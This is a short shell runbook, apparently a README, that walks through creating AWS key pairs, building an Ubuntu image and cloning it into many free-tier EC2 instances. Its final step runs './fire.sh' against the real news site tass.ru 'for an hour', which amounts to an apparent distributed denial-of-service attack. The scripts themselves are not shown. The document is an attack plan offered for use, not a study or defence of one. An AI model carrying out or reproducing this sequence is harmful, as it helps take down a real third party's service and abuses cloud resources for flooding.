# Create and download key pairs

./createKey.sh



# Create empty ubuntu instance

./createVanillaUbuntu.sh



# List IP addresses of vanilla instances

./listVanillasIPs.sh



# Install necessary packages and shut down

./remoteInstall.sh



# Create an image for the further usage

./createImages.sh



# Start the instance agan

./runTemplate.sh



# Clone images into new "Free tier eligible" instances
# The aprameter defines the number of new instances, e.g.:
# $ ./cloneTemplates.sh 31
# Beware of vCPU limit. The default is 64 (32×2 CPU in case of t2/t3.micro)
# To request more vCPUs, visit http://aws.amazon.com/contact-us/ec2-request

./cloneTemplates.sh 10



# List IP addresses of all online instances
# Beware, it takes time to bring the instance up.
# Wait a minute before the collecting of IP addresses.

./listInstancesIPs.sh



# Make a fire for an hour to the website defined as parameter

./fire.sh https://tass.ru/
